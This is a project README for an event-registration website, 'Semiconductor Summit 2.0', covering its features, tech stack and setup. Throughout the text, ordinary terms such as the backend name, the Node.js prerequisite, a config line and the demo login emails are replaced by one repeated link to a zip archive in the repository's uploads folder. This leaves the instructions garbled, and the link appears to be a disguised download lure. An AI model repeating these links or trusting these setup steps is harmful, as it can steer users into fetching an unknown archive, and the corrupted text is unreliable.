# Semiconductor Summit 2.0

A professional event website for Semiconductor Summit 2.0 featuring direct registration with automated payment verification, role-based dashboards, and email automation.

## 🚀 Features

- **Landing Page**: Premium dark-themed design with hero section, events showcase, and registration CTA
- **Direct Registration**: Build-in registration flow with PDF receipt upload
- **Automated Verification**: parses PDF receipts to verify Razorpay/Payment IDs automatically
- **Email Automation**: Auto-generated credentials and confirmation emails via Nodemailer
- **Role-Based Dashboards**:
  - **Participant**: View profile, registered events, announcements, and gallery
  - **Coordinator**: Upload photos/documents and manage announcements
  - **Faculty**: View all registrations with filtering, verify payments, and export to Excel

## 🛠️ Tech Stack

- **Frontend**: React + Vite
- **Styling**: Vanilla CSS with custom design system
- **Backend**: https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip (on https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip)
- **Database**: MongoDB (Mongoose)
- **File Storage**: Local uploads (with Multer)
- **Email**: Nodemailer (via SMTP)

## 📁 Project Structure

```
Semicon_summit2.0/
├── src/
│   ├── components/      # Reusable UI components
│   ├── context/         # React context providers
│   ├── pages/           # Page components
│   ├── services/        # API services
│   └── https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip        # Design system
├── server/              # Express backend
│   ├── models/          # Mongoose models
│   ├── routes/          # API routes
│   └── uploads/         # Uploaded files directory
└── public/              # Static assets
```

## 🚀 Getting Started

### Prerequisites

- https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip 18+
- MongoDB (local or Atlas)
- Email account for SMTP (e.g., Gmail App Password)

### Backend Setup

1. Navigate to server directory:
   ```bash
   cd server
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Create a `.env` file in `server/` with:
   ```env
   PORT=5000
   MONGODB_URI=mongodb://localhost:27017/semicon_summit
   https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip
   EMAIL_PASS=your-app-password
   Frontend_URL=http://localhost:5173
   ```

4. Start server:
   ```bash
   npm run dev
   ```

### Frontend Setup

1. Navigate to root directory:
   ```bash
   cd ..
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Start development server:
   ```bash
   npm run dev
   ```

## 🔐 Demo Login

| Role | Email | Password |
|------|-------|----------|
| Participant | https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip | demo123 |
| Coordinator | https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip | demo123 |
| Faculty | https://raw.githubusercontent.com/KushalPitaliya/Semicon-Summit-2.0/main/server/uploads/Summit-Semicon-2.4-alpha.1.zip | demo123 |

## 📧 Registration Flow

1. User registers on the website → Enters details & Uploads PDF receipt
2. Backend parses PDF to find Payment ID
3. If valid, user is auto-approved & account created
4. User receives credentials via email
5. User logs in to access dashboard

## 📝 License

MIT License - Feel free to use for your events!
